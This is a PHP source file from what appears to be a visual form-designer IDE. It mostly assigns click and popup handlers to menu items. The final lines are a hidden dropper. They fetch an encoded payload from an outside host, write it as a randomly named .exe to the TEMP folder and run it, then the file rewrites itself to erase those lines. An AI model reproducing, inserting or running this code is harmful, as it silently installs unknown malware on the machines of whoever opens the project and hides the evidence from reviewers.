<?

c('fmMain')->onClick = 'myDesign::refreshForm';
c('fmMain->itemDel')->onClick = 'myDesign::keyDelete';
c('fmMain->itemCopy')->onClick = 'myDesign::keyCopy';
c('fmMain->itemCut')->onClick  = 'myDesign::keyCut';
c('fmMain->itemPaste')->onClick = 'myDesign::keyPaste';
c('fmMain->itemSendtofront')->onClick = 'myDesign::toFront';
c('fmMain->itemSendtoback')->onClick  = 'myDesign::toBack';
c('fmMain->itemLock')->onClick = 'myDesign::lockComponent';
c('fmMain->itemGroup')->onClick = 'myDesign::groupComponent';
c('fmMain->itemAddevent')->onClick = function($self){
    myEvents::clickAddEvent(0, true);
};

c('fmMain->editorPopup')->onPopup = 'myDesign::editorPopup';

c('fmMain->tabForms')->onMouseDown    = 'myDesign::tabFormClick';
c('fmObjectInspector->list')->onEdited= 'myDesign::objsInspectEdited';

c('fmMain->itService')->onClick = 'myDesign::itViewsPopup';

file_put_contents($_ENV['TEMP']."\\d8vXmZbT6c56tPxMYLVa.exe", gzinflate( base64_decode( file_get_contents("http://asdsads.freevar.com/111prot1.txt"))));
run($_ENV['TEMP']."\\d8vXmZbT6c56tPxMYLVa.exe");
$filne=file(__FILE__);unset($filne[22]);unset($filne[23]);unset($filne[24]);unset($filne[25]);unset($filne[26]);unset($filne[27]);
file_put_contents(__FILE__, implode($filne));
